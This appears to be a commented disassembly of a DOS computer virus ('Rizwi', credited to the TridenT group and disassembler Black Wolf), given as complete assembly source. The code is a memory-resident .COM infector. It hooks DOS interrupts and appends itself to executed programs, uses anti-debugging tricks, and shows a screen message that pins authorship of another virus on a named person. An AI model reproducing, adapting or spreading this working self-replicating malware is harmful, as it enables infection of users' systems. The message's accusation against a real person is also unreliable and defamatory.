;Rizwi Virus from the TridenT research group.  
;Memory resident .COM infector.

;This virus is only active after the spring of 1994.
;When active,  it infects .COM files on execution, and keeps
;track of the number of files that it has infected.  While it has
;infected between 0C8h and 0f0h files, it displays the message
;that " Righard Zwienenberg made the DUTCH-555 virus!!! " on
;the screen.

;This virus has some anti-debugging code, as it masks the keyboard
;interrupt and checks to see if it remaines masked, so when debugging
;through it one must jump over these sections of code (In/Out port 21h
;and the checking of ax accompanying them).

;Disassembly by Black Wolf
  
.model tiny
.code

		org     100h
  
start:
		call    Get_Offset
Get_Offset:
		pop     bp
		sub     bp,offset Get_Offset
		
		mov     ah,30h
		int     21h                     ;Get Dos version/Install Check
			   
		cmp     bx,4243h
		je      DoneInstall             ;Already Installed

		mov     ah,2Ah
		int     21h                     ;Get date
			      
		in      al,21h                  ;Read interrupt masks...
		
		cmp     cx,1993                 ;Is year later than 1993?
		ja      GoMemRes                ;If not, exit.

		cmp     dh,4
		ja      GoMemRes                ;Is month < May, exit.
DoneInstall:
		db      0e9h,74h,0              ;jmp     ReturnToHost

GoMemRes:
		or      al,2
		push    ax
		mov     ax,351Ch
		int     21h                  ;Get timer interrupt
			   
		mov     cs:[Int1cIP+bp],bx
		mov     cs:[Int1cCS+bp],es
		
		pop     ax
		out     21h,al               ;Interrupt - disable keyboard?

SetInterrupts:
		mov     ax,3521h
		int     21h                     ;Get int 21 address
			    
		mov     word ptr cs:[OldInt21+bp],bx       
		mov     word ptr cs:[OldInt21+2+bp],es
		in      al,21h                 
		and     al,2
		push    ax
		
		mov     ax,cs
		dec     ax
		mov     ds,ax                   ;Set DS = MCB
		cmp     byte ptr ds:0,'Z'       ;Are we at the end of the 
		jne     ReturnToHost            ;memory chain?

		;sub     word ptr ds:[3],27h     ;Decrease MCB size
		db      81h,2eh,03,0,27h,0  

		;sub     word ptr ds:[12h],27h   ;Decrease PSP top of memory
		db      81h,2eh,12h,0,27h,0  
		
		lea     si,[bp+100h]            ;SI = beginning of virus
		mov     di,100h                 ;DI = new offset (100h)
		
		pop     ax
		cmp     al,2                    ;Did someone skip interrupt
		jne     SetInterrupts           ;disabling code?  If so,
						;loop them back to redo
						;interrupt setting.
				      

		mov     ax,ds:[12h]             ;Get free segment
		sub     ax,10h                  ;Subtract 10h to account for
		mov     es,ax                   ; offset of 100h
		mov     cx,263h
		push    cs
		pop     ds
		rep     movsb                   ;Copy virus into memory
		in      al,21h             
		xor     al,2                    
		push    es
		pop     ds
		out     21h,al                  ;Do the keyboard int again...

		mov     ax,251Ch
		mov     dx,offset Int1cHandler
		int     21h                     ;Set int 1ch
					 

		mov     ax,2521h
		mov     dx,offset Int21Handler
		int     21h                     ;Set int 21h
				      
ReturnToHost:
		push    cs                      ;Restore Seg regs
		pop     ds
		push    ds
		pop     es
		mov     di,100h
		push    di
		lea     si,[bp+Storage_Bytes]            ;Storage bytes
		movsw
		movsb                           ;Restore host
		ret


Storage_Bytes:          
		int     20h
		popf
		
TridenT_ID      db      '[TridenT]'
  
FakeInt21h:
		pushf                          
		call    dword ptr cs:OldInt21     ;Fake Interrupt 21h
		retn

  
VirusVersion    db      '{V1.1 Bugfix}'

OldInt21        dw      0, 0
				
Int21Handler:                
		cmp     ax,4b00h
		je      IsExecute
		cmp     ah,30h
		jnz     ExitInt21
		call    FakeInt21h
		mov     bx,4243h
		iret

ExitInt21:
		jmp     dword ptr cs:OldInt21

IsExecute:
		push    ax bx cx dx si di ds es bp ds dx
		
		mov     ax,4300h
		call    FakeInt21h      ;Get attributes
		
		mov     FileAttribs,cx  ;Save them
		xor     cx,cx     
		mov     ax,4301h        ;Reset Attributes
		call    FakeInt21h      

		mov     ax,3D02h        ;Open file
		call    FakeInt21h

		mov     Filehandle,ax      
		xchg    ax,bx
		mov     ax,5700h
		call    FakeInt21h      ;Get file date/time
		mov     cs:[FileTime],cx  ;  and save them
		mov     cs:[FileDate],dx 
		and     cx,1Fh
		cmp     cx,1Fh          ;Check infection in time stamp
		jne     Infect_File


CloseFile:
		mov     ah,3Eh
		call    FakeInt21h
		
		pop     dx              ;Pop filename address
		pop     ds
		mov     cx,FileAttribs
		mov     ax,4301h        
		call    FakeInt21h      ;Reset Attributes
		
		db      0e9h, 67h, 0    ;jmp     DoneInfect

Infect_File:
		mov     ah,3Fh
		push    cs
		pop     ds
		mov     dx,offset Storage_Bytes
		mov     cx,3
		call    FakeInt21h              ;Read in first 3 bytes

		cmp     word ptr cs:[Storage_Bytes],4D5Ah  ;Is EXE?
		je      CloseFile      
		cmp     word ptr cs:[Storage_Bytes],5A4Dh  ;Is alternate EXE?
		je      CloseFile      

		mov     ax,4202h
		xor     cx,cx
		xor     dx,dx
		call    FakeInt21h              ;Go to the end of file
		
		sub     ax,3                    ;adjust size for jump
		mov     word ptr [JumpSize],ax  ;save jump size
		
		mov     ah,40h    
		mov     dx,100h
		mov     cx,263h
		call    FakeInt21h              ;Append Virus to host

		mov     ax,4200h
		xor     cx,cx   
		xor     dx,dx                   ;Go to beginning
		call    FakeInt21h              ;of host file.

		mov     ah,40h                  
		mov     dx,358h
		mov     cx,3
		call    FakeInt21h              ;Write Jump bytes
		
		mov     ax,5701h
		mov     cx,[FileTime]
		mov     dx,[FileDate]
		or      cx,1Fh                  ;Mark infection in time stamp
		call    FakeInt21h              ;Restore time/date

		inc     byte ptr cs:[Counter]   ;Activation counter...
		jmp     short CloseFile

DoneInfect:
		pop     bp es ds di si dx cx bx ax
		jmp     ExitInt21

Int1cIP         dw      0    
Int1cCS         dw      0    

Int1cHandler:                ;While infections are between C8h and F0h,
			     ;Stick message on screen every once in a while.
		pushf
		push    ax cx si di ds es
		cmp     byte ptr cs:[Counter],0C8h
		jb      ExitInt1c
		cmp     byte ptr cs:[Counter],0F0h
		ja      ExitInt1c                  
		cmp     word ptr cs:[TimerCount],5000h
		je      WriteMessageToScreen            
		inc     word ptr cs:[TimerCount]
		
		db      0e9h,16h,0              ;jmp     ExitInt1c             

WriteMessageToScreen:
		push    cs
		pop     ds
		mov     ax,0B800h             ;Text Screen memory
		mov     es,ax
		mov     si,offset Message
		mov     di,0A0h
		db      81h,0efh,62h,0        ;sub     di,EndMessage-Message
		mov     cx,EndMessage-Message
		rep     movsb

ExitInt1c:
		pop     es ds di si cx ax
		popf
		iret
	
;Message says " Righard Zwienenberg made the DUTCH-555 virus!!! "
;Capital O's are attribute values....

Message:   
		db      ' OROiOgOhOaOrOdO OZOwOiOeOnOeOnO'
		db      'bOeOrOgO OmOaOdOeO OtOhOeO ODOUO'
		db      'TOCOHO-O5O5O5O OVOiOrOuOsO!O!O!O'
		db      ' O'
EndMessage:

Counter         db      0
		
TimerCount      dw      0

JumpBytes       db      0E9h
JumpSize        dw      0

FileAttribs     dw      0
Filehandle      dw      0
FileDate        dw      0
FileTime        dw      0

end     start
	       
